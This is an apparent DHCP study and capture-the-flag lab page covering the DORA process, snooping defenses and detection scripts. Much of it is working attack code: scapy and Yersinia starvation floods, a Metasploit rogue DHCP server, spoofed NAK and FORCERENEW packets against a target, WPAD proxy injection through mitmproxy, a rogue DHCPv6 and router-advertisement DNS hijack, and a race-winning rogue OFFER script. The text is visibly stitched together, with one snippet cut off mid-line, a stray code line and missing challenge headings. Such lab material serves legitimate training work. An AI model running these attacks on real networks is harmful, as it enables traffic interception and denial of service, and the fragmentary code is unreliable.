DHCP

Overview

  • Port: UDP 67 (server), UDP 68 (client)
  • Scope: valid IP addresses DHCP can assign
  • Reservations: certain IPs go to certain devices (by MAC address)
  • Lease: default is 24 hours, corporate is 7-30 days
  • Needed configurations: IP address, subnet mask, default gateway, DNS server IP
  • APIPA: when DHCP fails, assigns 169.254.x.x address

DORA Process

Step Description Type Packet
Discover Client: "I need an IP address" Broadcast src: 0.0.0.0 → dst: 255.255.255.255
Offer Server: "Here, try this one" Broadcast Server offers IP + lease time + gateway + DNS
Request Client: "Yes, I want this one" Broadcast Client accepts offer (broadcast so other servers know)
Acknowledge Server: "Confirmed, it's yours" Broadcast Server finalizes lease, records MAC→IP mapping

DHCP Attacks

DHCP Starvation

Flood the server with DISCOVER packets using random MACs until the entire scope is exhausted. Legitimate clients can't get addresses.

# Using Yersinia
yersinia dhcp -attack 1 -interface eth0

# Using scapy
python3 -c "
from scapy.all import *
for i in range(256):
    mac = RandMAC()
    pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / \
          IP(src='0.0.0.0', dst='255.255.255.255') / \
          UDP(sport=68, dport=67) / \
          BOOTP(chaddr=mac) / \
          DHCP(options=[('message-type','discover'), 'end'])
    sendp(pkt)
"

Rogue DHCP Server

After starving the legitimate server, set up your own DHCP server that assigns clients your machine as the gateway → MITM all traffic.

# Using Metasploit
use auxiliary/server/dhcp
set SRVHOST 192.168.1.100
set NETMASK 255.255.255.0
set ROUTER 192.168.1.100    # your machine as gateway
set DNSSERVER 192.168.1.100  # your machine for DNS
run

DHCP Snooping (Defense)

Switch-level defense: only trusted ports can send DHCP server messages (OFFER, ACK). Untrusted ports can only send client messages.

# Cisco switch configuration
ip dhcp snooping
ip dhcp snooping vlan 10
interface gi0/1
  ip dhcp snooping trust     # uplink to legitimate DHCP server
interface range gi0/2-24
  ip dhcp snooping limit rate 10  # rate limit on client ports

Useful Commands

# Linux
dhclient -v                    # request DHCP lease (verbose)
dhclient -r                    # release current lease
cat /var/lib/dhcp/dhclient.leases   # view lease info

# Windows
ipconfig /release              # release DHCP lease
ipconfig /renew                # request new lease
ipconfig /all                  # view DHCP info (including server IP)

Lab 6: DHCP Fingerprinting

Medium

Objective: Identify device types based on their DHCP request options and vendor class identifiers. Build a network device inventory from DHCP traffic.

from scapy.all import *

pkts = rdpcap("dhcp_traffic.pcap")

devices = {}
for pkt in pkts:
    if pkt.haslayer(DHCP) and pkt.haslayer(BOOTP):
        mac = pkt[BOOTP].chaddr[:6].hex(":")
        options = {opt[0]: opt[1] if len(opt) > 1 else None
                   for opt in pkt[DHCP].options if isinstance(opt, tuple)}

        if mac not in devices:
            devices[mac] = {"hostname": None, "vendor": None, "params": None}

        if "hostname" in options:
            devices[mac]["hostname"] = options["hostname"].decode() if isinstance(options["hostname"], bytes) else options["hostname"]
        if "vendor_class_id" in options:
            vc = options["vendor_class_id"]
            devices[mac]["vendor"] = vc.decode() if isinstance(vc, bytes) else vc
        if "param_req_list" in options:
            devices[mac]["params"] = list(options["param_req_list"])

print(f"{'MAC':20s} {'Hostname':20s} {'Vendor Class':30s} {'Param List'}")
print("-" * 90)
for mac, info in devices.items():
    # Vendor class hints at OS: MSFT 5.0 = Windows, dhcpcd = Linux, etc.
    print(f"{mac:20s} {str(info['hostname']):20s} {str(info['vendor']):30s} {str(info['params'])[:30]}")

    configs = []

#!/usr/bin/env python3
"""Parse dnsmasq lease file and detect anomalies."""
import time

with open("/var/lib/misc/dnsmasq.leases") as f:
    leases = []
    for line in f:
        parts = line.strip().split()
        if len(parts) >= 4:
            expiry, mac, ip, hostname = parts[0], parts[1], parts[2], parts[3]
            leases.append({"expiry": int(expiry), "mac": mac, "ip": ip, "hostname": hostname})

# Detect: same MAC with multiple IPs (normal) vs many MACs from one vendor (starvation)
from collections import Counter
oui_counts = Counter(l["mac"][:8] for l in leases)

print("=== Vendor (OUI) Distribution ===")
for oui, count in oui_counts.most_common(10):
    print(f"  {oui}: {count} leases")
    if count > 20:
        print(f"  [!] Possible starvation attack from {oui}!")

# Check for expired vs active
now = int(time.time())
active = [l for l in leases if l["expiry"] > now]
expired = [l for l in leases if l["expiry"] <= now]
print(f"\nActive: {len(active)}, Expired: {len(expired)}")

Lab 11: Custom DHCP Server

Medium

Objective: Build a minimal DHCP server with scapy that responds to DISCOVER/REQUEST messages with valid configuration.

from scapy.all import *
import threading

POOL_START = 100
POOL_END = 200
SERVER_IP = "192.168.1.1"
SUBNET = "255.255.255.0"
DNS = "8.8.8.8"
LEASE_TIME = 3600
leases = {}
next_ip = POOL_START

def get_next_ip():
    global next_ip
    ip = f"192.168.1.{next_ip}"
    next_ip += 1
    if next_ip > POOL_END:
        next_ip = POOL_START
    return ip

def dhcp_handler(pkt):
    global next_ip
    if not pkt.haslayer(DHCP):
        return

    msg_type = next((o[1] for o in pkt[DHCP].options
                    if isinstance(o, tuple) and o[0] == "message-type"), None)
    mac = pkt[BOOTP].chaddr[:6].hex(":")
    xid = pkt[BOOTP].xid

    if msg_type == 1:  # DISCOVER
        offer_ip = leases.get(mac, get_next_ip())
        leases[mac] = offer_ip
        reply = Ether(dst=pkt[Ether].src)/IP(src=SERVER_IP, dst="255.255.255.255")/ \
                UDP(sport=67, dport=68)/ \
                BOOTP(op=2, yiaddr=offer_ip, siaddr=SERVER_IP, xid=xid, chaddr=pkt[BOOTP].chaddr)/ \
                DHCP(options=[("message-type","offer"),("server_id",SERVER_IP),
                    ("subnet_mask",SUBNET),("router",SERVER_IP),
                    ("name_server",DNS),("lease_time",LEASE_TIME),"end"])
        sendp(reply, verbose=0)
        print(f"[OFFER] {mac} → {offer_ip}")

    elif msg_type == 3:  # REQUEST
        req_ip = leases.get(mac, "0.0.0.0")
        reply = Ether(dst=pkt[Ether].src)/IP(src=SERVER_IP, dst="255.255.255.255")/ \
                UDP(sport=67, dport=68)/ \
                BOOTP(op=2, yiaddr=req_ip, siaddr=SERVER_IP, xid=xid, chaddr=pkt[BOOTP].chaddr)/ \
                DHCP(options=[("message-type","ack"),("server_id",SERVER_IP),
                    ("subnet_mask",SUBNET),("router",SERVER_IP),
                    ("name_server",DNS),("lease_time",LEASE_TIME),"end"])
        sendp(reply, verbose=0)
        print(f"[ACK] {mac} → {req_ip}")

print("[*] Custom DHCP server running...")
sniff(filter="udp and port 67", prn=dhcp_handler, store=0)

# Rogue DHCP detector — send DISCOVER and check who responds
from scapy.all import *
import time

def detect_rogue_dhcp(expected_server="192.168.1.1", iface="eth0"):
    # Send DHCP Discover
    discover = Ether(dst="ff:ff:ff:ff:ff:ff") / \
               IP(src="0.0.0.0", dst="255.255.255.255") / \
               UDP(sport=68, dport=67) / \
               BOOTP(chaddr=RandMAC()) / \
               DHCP(options=[("message-type", "discover"), "end"])

    print("[*] Sending DHCP Discover...")
    sendp(discover, iface=iface, verbose=0)

    # Collect all OFFER responses
    offers = sniff(filter="udp and port 68", timeout=5, iface=iface)

    servers = set()
    for pkt in offers:
        if pkt.haslayer(DHCP):
            opts = {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}
            if opts.get("message-type") == 2:  # OFFER
                server = opts.get("server_id", pkt[IP].src)
                servers.add(server)
                gateway = opts.get("router", "N/A")
                dns = opts.get("name_server", "N/A")
                print(f"  [OFFER] Server: {server}, Gateway: {gateway}, DNS: {dns}")
                if server != expected_server:
                    print(f"  [!!!] ROGUE DHCP SERVER DETECTED: {server}")

    print(f"\n[+] Found {len(servers)} DHCP server(s): {servers}")
    return servers

from scapy.all import *
from collections import Counter

pkts = rdpcap("starvation.pcap")

# DHCP Discovers with random MACs all come from one physical interface
# The Ethernet source MAC stays the same even though BOOTP chaddr changes
discovers = [p for p in pkts if p.haslayer(DHCP) and

Challenge 5: Lease Time Manipulation

Medium

A DHCP server is configured with 1-hour leases. You need to force a target to renew its lease so that your rogue server can respond instead. Craft the right DHCP packets to force renewal.

from scapy.all import *

target_ip = "192.168.1.100"
target_mac = "de:ad:be:ef:00:01"

# Method 1: Send DHCP NAK (forces immediate release + re-DISCOVER)
nak = Ether(dst=target_mac) / IP(src="192.168.1.1", dst=target_ip) / \
      UDP(sport=67, dport=68) / \
      BOOTP(op=2, yiaddr="0.0.0.0", chaddr=bytes.fromhex(target_mac.replace(":",""))) / \
      DHCP(options=[("message-type", "nak"),
                    ("server_id", "192.168.1.1"), "end"])
sendp(nak, verbose=0)

# Method 2: Send DHCP FORCERENEW (RFC 3203)
forcerenew = Ether(dst=target_mac) / IP(src="192.168.1.1", dst=target_ip) / \
             UDP(sport=67, dport=68) / \
             BOOTP(op=2, chaddr=bytes.fromhex(target_mac.replace(":",""))) / \
             DHCP(options=[("message-type", 9), "end"])  # type 9 = FORCERENEW
sendp(forcerenew, verbose=0)

# Now have your rogue DHCP server ready to respond to the new DISCOVER

A DHCP NAK from the "server" forces the client to restart the DORA process. Spoof the NAK as if it came from the legitimate server. Your rogue server must respond faster than the real one to win the race.

A network client uses WPAD (Web Proxy Auto-Discovery) via DHCP option 252. Inject a malicious WPAD URL via your rogue DHCP server to redirect HTTP traffic through your proxy. The flag is in one of the proxied HTTP requests.

# Step 1: Set up a web server hosting wpad.dat
cat << 'EOF' > /var/www/html/wpad.dat
function FindProxyForURL(url, host) {
    return "PROXY 192.168.1.66:8080";
}
EOF

# Step 2: Start HTTP server for WPAD
python3 -m http.server 80 --directory /var/www/html &

# Step 3: Start proxy to intercept traffic
mitmproxy --listen-port 8080 --set console_focus_follow=true

# Step 4: Inject DHCP option 252
# In your rogue DHCP server, add:
# ("252", b"http://192.168.1.66/wpad.dat")

# The victim's browser will auto-configure to use your proxy
# All HTTP traffic now flows through mitmproxy

DHCP option 252 tells the client where to find the WPAD proxy configuration file. Serve a wpad.dat that points to your mitmproxy. The flag appears in one of the intercepted HTTP POST requests.

Challenge 7: DHCPv6 Attack

Hard

A dual-stack network has DHCPv6 enabled. Deploy a rogue DHCPv6 server to assign yourself as the DNS server for IPv6, then intercept DNS queries to redirect a domain to your IP and serve the flag.

from scapy.all import *

# Rogue Router Advertisement with DHCPv6 managed flag
ra = IPv6(dst="ff02::1") / \
     ICMPv6ND_RA(M=1, O=1) / \
     ICMPv6NDOptPrefixInfo(prefix="2001:db8::", prefixlen=64, A=0)
send(ra, loop=1, inter=5)  # background this
# Set up rogue DHCPv6 server with dnsmasq
cat << 'EOF' > /tmp/dhcpv6.conf
dhcp-range=::100,::200,constructor:eth0,ra-stateless
dhcp-option=option6:dns-server,[YOUR_IPv6_ADDRESS]
EOF
sudo dnsmasq -d --conf-file=/tmp/dhcpv6.conf

# Set up DNS server that redirects target domain
# dnsmasq: address=/target.com/YOUR_IP
# Then serve the flag on your web server

Send Router Advertisements with the M flag set to tell hosts to use DHCPv6. Your DHCPv6 server assigns your IP as the DNS server. When victims resolve flag.target.com, your DNS responds with your IP. Serve the flag on port 80. This works even if the network has IPv4 DHCP snooping since DHCPv6 is often unmonitored.

Challenge 8: Hidden DHCP Options

Easy

A pcap contains DHCP ACK packets with the flag hidden in a custom DHCP option (vendor-specific option 43 or option 224+). Parse the packets to extract it.

from scapy.all import *

pkts = rdpcap("hidden_options.pcap")

for pkt in pkts:
    if pkt.haslayer(DHCP):
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple):
                code = opt[0]
                # Check vendor-specific and private options
                if code in ("vendor_class_id", 43) or (isinstance(code, int) and code >= 224):
                    value = opt[1]
                    if isinstance(value, bytes):
                        print(f"Option {code}: {value.decode(errors='ignore')}")
                    else:
                        print(f"Option {code}: {value}")

# The flag is in option 43 (vendor-specific) or option 224+ (private use)

Filter for DHCP ACK packets (message type 5). Expand all DHCP options — the flag is in a non-standard option number above 224 or inside vendor-specific option 43. The value may be hex-encoded.

Challenge 9: DHCP Race Condition

Hard

A legitimate DHCP server responds within 50ms. Your rogue server must respond faster to win the DORA race. Set up a pre-computed OFFER response triggered by incoming DISCOVERs to beat the legitimate server.

from scapy.all import *
import time

SERVER_IP = "192.168.1.66"
FAKE_GW = "192.168.1.66"
FAKE_DNS = "192.168.1.66"

# Pre-build the response template for speed
def fast_offer(pkt):
    if not pkt.haslayer(DHCP):
        return
    opts = {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}
    if opts.get("message-type") != 1:  # not DISCOVER
        return

    start = time.time()
    offer = Ether(dst=pkt[Ether].src, src=get_if_hwaddr("eth0")) / \
            IP(src=SERVER_IP, dst="255.255.255.255") / \
            UDP(sport=67, dport=68) / \
            BOOTP(op=2, yiaddr="192.168.1.200",
                  siaddr=SERVER_IP, xid=pkt[BOOTP].xid,
                  chaddr=pkt[BOOTP].chaddr) / \
            DHCP(options=[("message-type", "offer"),
                          ("server_id", SERVER_IP),
                          ("subnet_mask", "255.255.255.0"),
                          ("router", FAKE_GW),
                          ("name_server", FAKE_DNS),
                          ("lease_time", 3600), "end"])
    sendp(offer, verbose=0)
    elapsed = (time.time() - start) * 1000
    print(f"[+] OFFER sent in {elapsed:.1f}ms (must be < 50ms)")

sniff(filter="udp and port 67", prn=fast_offer, store=0)

Pre-compute as much of the packet as possible. Use sendp() at layer 2 instead of send() to skip kernel routing. The XID and chaddr must match the DISCOVER. Run your script with high process priority (nice -n -20) for minimal latency.

Challenge 10: DHCP Scope Exhaustion Detector

Medium

Write a monitoring script that watches DHCP traffic and alerts when the address pool is nearing exhaustion. Given a pcap of a starvation attack in progress, determine the exact timestamp when 90% of the pool was consumed.

from scapy.all import *
from datetime import datetime

POOL_SIZE = 100  # e.g., 192.168.1.100 - 192.168.1.199
ALERT_THRESHOLD = 0.9

pkts = rdpcap("starvation_in_progress.pcap")
assigned_ips = set()
alert_time = None

for pkt in pkts:
    if pkt.haslayer(DHCP):
        opts = {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}
        if opts.get("message-type") == 5:  # ACK
            assigned_ip = pkt[BOOTP].yiaddr
            assigned_ips.add(assigned_ip)
            utilization = len(assigned_ips) / POOL_SIZE

            if utilization >= ALERT_THRESHOLD and alert_time is None:
                alert_time = float(pkt.time)
                ts = datetime.fromtimestamp(alert_time).strftime("%Y-%m-%d %H:%M:%S")
                print(f"[!] 90% pool exhaustion at {ts}")
                print(f"    Assigned: {len(assigned_ips)}/{POOL_SIZE}")

print(f"\nTotal IPs assigned: {len(assigned_ips)}")
# FLAG{timestamp_of_90pct}

Track DHCP ACK packets (message type 5) and collect unique yiaddr values. Count unique IPs assigned over time. The pool size is given — calculate when unique assignments reach 90% of the pool. Use pkt.time for the timestamp.
